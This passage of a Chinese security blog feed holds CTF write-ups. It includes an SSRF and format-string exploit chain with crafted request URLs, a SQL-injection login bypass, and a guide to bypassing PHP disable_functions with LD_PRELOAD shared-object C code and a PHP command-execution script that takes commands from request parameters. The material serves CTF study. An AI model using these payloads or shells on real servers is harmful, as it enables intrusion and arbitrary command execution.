$output = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $output = <span class="string">'rua'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几个小trick</p><ul><li><code>$head = \</code> 这样拼接之后就是根命名空间</li><li>协议基本都被过滤干净了就只能用http协议</li><li><code>$begin= %s%</code></li><li>过滤了 <code>log</code>，我估计是出题人不想让你去读日志(因为后面发现可以读除了flag之外的任意文件)</li></ul><p>之后就扫内网，看到开放了8080端口</p><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/1583812423811.png" alt></p><p>这里的坑点就比较多了，首先需要知道vipcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head&#x3D;\&amp;url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#123;file.vip.__dict__&#125;%26vipcode&#x3D;0&amp;begin&#x3D;%s%</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/1583812448622.png" alt></p><p>然后读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?head&#x3D;\&amp;url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#x2F;app&#x2F;base&#x2F;vip.py%26vipcode&#x3D;m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin&#x3D;%s%</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/1583812465323.png" alt></p><p><code>vip.py</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Welcome,dear vip! Here are what you want:</span><br><span class="line">The file you read <span class="keyword">is</span>:</span><br><span class="line">/app/base/vip.py</span><br><span class="line"></span><br><span class="line">The content <span class="keyword">is</span>:</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span>:</span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.truevipcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Other files under the same folder:</span><br><span class="line">__pycache__ __init__.py vip.py readfile.py%d</span><br></pre></td></tr></table></figure><p><code>readfile.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure><p>过滤掉了 <code>fl4g</code></p><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/0-1583812648124.png" alt></p><p>看到 <code>current_folder_file</code> 是 global 的</p><p>所以读一次根目录的文件，让<code>current_folder_file</code> 里面有 <code>fl4g</code></p><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/0-1583812681289.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?head&#x3D;\&amp;url&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;read&#x2F;file&#x3D;&#x2F;&#123;vipfile.__class__.GetName.__globals__[current_folder_file][21]&#125;&#x2F;flag%26vipcode&#x3D;m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin&#x3D;%s%</span><br></pre></td></tr></table></figure><p>或者这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.37.179.47:1101&#x2F;?head&#x3D;\&amp;begin&#x3D;%1$s&amp;url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#123;vipfile.__class__.__init__.__globals__[__name__][9]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;flag%26vipcode&#x3D;kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</span><br></pre></td></tr></table></figure><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>false注入</p><p><code>username=&#39;%&#39;1&amp;password=&#39;%&#39;1</code></p><p>即可</p><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行进阶</title>
      <link href="/posts/137d2c1/"/>
      <url>/posts/137d2c1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过disable_function总结</title>
      <link href="/posts/1cc6bf70/"/>
      <url>/posts/1cc6bf70/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>有一部分CTF题目，当你拿到webshell，蚁剑连接上去之后，却不能执行系统命令，这就是要绕过 <code>disable_function</code> 了</p><p><img src= "/img/loading.gif" data-src="/posts/1cc6bf70/1583650697704.png" alt="、"></p><p>可以看到禁用了很多函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</span><br></pre></td></tr></table></figure><h2 id="LD-PRELOAD-劫持系统函数"><a href="#LD-PRELOAD-劫持系统函数" class="headerlink" title="LD_PRELOAD 劫持系统函数"></a>LD_PRELOAD 劫持系统函数</h2><blockquote><p>LD_PRELOAD 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。</p></blockquote><p>所以我们就可以通过利用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意的.so文件，达到执行系统命令的效果</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ LD_PRELOAD&#x3D;&#x2F;path&#x2F;to&#x2F;my&#x2F;malloc.so &#x2F;bin&#x2F;ls</span><br></pre></td></tr></table></figure><p>即在执行<code>ls</code>命令前，会先加载指定路径的<code>malloc.so</code>文件，如果这是一个恶意共享对象，那么可以执行任意操作。</p><p>我们可以通过<code>readelf</code>命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用<code>LD_PRELOAD</code>环境变量指定生成的对象，达到命令执行的目的。</p><h3 id="一个简单的劫持示例"><a href="#一个简单的劫持示例" class="headerlink" title="一个简单的劫持示例"></a>一个简单的劫持示例</h3><p><code>getpid.c</code> 的内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo 'pwned by getpid!'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    payload();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在这里劫持了 <code>getpid</code> 函数，由于python运行的时候使用了 <code>getpid</code> 函数，所以可以通过 <code>LD_PRELODAD</code> 来执行任意命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC getpid.c -o getpid.so</span><br><span class="line">LD_PRELOAD&#x3D;.&#x2F;getpid.so python</span><br></pre></td></tr></table></figure><p>执行效果</p><p><img src= "/img/loading.gif" data-src="/posts/1cc6bf70/1583651075354.png" alt></p><p>注意：因为通过设置<code>preload</code>劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时<code>unsetenv(&quot;LD_PRELOAD&quot;)</code>则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，</p><p>所以绕过php disable_function也就比较简单了</p><blockquote><p>php中的mail、error_log函数是通过调用系统中的sendmail命令实现的(其他类似php中的函数还有imap_mail、mb_send_mail<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">参考</a>)，sendmail二进制文件中使用了getuid库函数，这样我们可以覆盖getuid函数。</p></blockquote><p>写一个 <code>getuid</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -shared -fPIC geteuid.c -o getuid.so</code> 编译成动态链接库。</p><p>然后再写一个php文件，设置好 <code>EVIL_CMDLINE</code> 环境变量，同时需要执行 so 文件地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd = $_REQUEST[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_REQUEST[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_REQUEST[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="无需劫持函数绕过-disable-function"><a href="#无需劫持函数绕过-disable-function" class="headerlink" title="无需劫持函数绕过 disable_function"></a>无需劫持函数绕过 disable_function</h2><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?files=1&tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">下载地址</a></p><blockquote><p>GCC 有个 C 语言扩展修饰符<strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行<strong>attribute</strong>((constructor)) 修饰的函数。</p></blockquote><p>于是修改一下原来的共享链接库代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这意味着，我们只需要找到该php环境中存在执行系统命令的函数、且putenv函数未被禁用的情况下，就可以绕过disable_function。</p></blockquote><p>演示一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo 'pwned!'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    payload();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/1cc6bf70/1583651506472.png" alt></p><h2 id="php7绕过disable-funtion"><a href="#php7绕过disable-funtion" class="headerlink" title="php7绕过disable_funtion"></a>php7绕过disable_funtion</h2><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">脚本地址</a></p><h2 id="ctfhub题目"><a href="#ctfhub题目" class="headerlink" title="ctfhub题目"></a>ctfhub题目</h2><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>使用蚁剑连接之后，直接加载插件，之后生成一个 <code>.antproxy.php</code> ，选择这个文件连接即可(密码不变)</p><p><img src= "/img/loading.gif" data-src="/posts/1cc6bf70/1583651719652.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kylingit.com/blog/利用ld_preload绕过disbale_functions/" target="_blank" rel="noopener">https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</a></p><p><a href="https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD劫持系统函数.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0.html</a></p><p><a href="https://blog.szfszf.top/article/37/" target="_blank" rel="noopener">https://blog.szfszf.top/article/37/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络侦察实验</title>
      <link href="/posts/ea51772/"/>
      <url>/posts/ea51772/</url>
      
